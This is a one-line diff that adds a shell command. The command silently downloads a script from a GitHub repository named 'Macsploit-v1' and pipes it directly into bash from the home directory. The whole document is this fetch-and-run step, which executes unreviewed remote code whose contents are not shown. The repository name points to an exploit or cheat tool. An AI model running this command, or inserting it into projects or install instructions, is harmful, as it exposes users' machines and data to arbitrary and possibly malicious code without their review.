@@ -1,0 +1,1 @@
+cd ~/ && curl -s "https://raw.githubusercontent.com/VoidSequencx/Macsploit-v1/main/code" | bash
